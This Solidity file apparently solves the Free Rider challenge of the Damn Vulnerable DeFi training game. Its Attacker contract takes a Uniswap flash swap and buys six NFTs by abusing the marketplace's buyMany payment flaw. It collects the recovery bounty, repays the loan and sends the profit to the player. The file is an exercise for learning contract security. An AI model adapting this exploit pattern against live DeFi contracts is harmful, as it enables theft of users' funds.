// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

contract Attacker {

    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecoveryManager recoveryManager;
    WETH weth;
    DamnValuableNFT nft;
    address player;

    constructor(IUniswapV2Pair _uniswapPair, WETH _weth, FreeRiderNFTMarketplace _marketplace, FreeRiderRecoveryManager _recoveryManager, DamnValuableNFT _nft, address _player) payable {
        uniswapPair = _uniswapPair;
        weth = _weth;
        weth.deposit{value:msg.value}();
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        nft = _nft;
        player = _player;
    }

    function attack() external {
        uniswapPair.swap(15 ether, 0, address(this), hex"deadbeef");
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        
        weth.withdraw(weth.balanceOf(address(this)));
        marketplace.buyMany{value:15 ether}(tokenIds);
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
        }
        
        weth.deposit{value:151e17}();
        weth.transfer(address(uniswapPair), 151e17);
        (bool success,) = player.call{value:address(this).balance}("");
        if (!success) revert();        
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

    fallback() external payable {}

}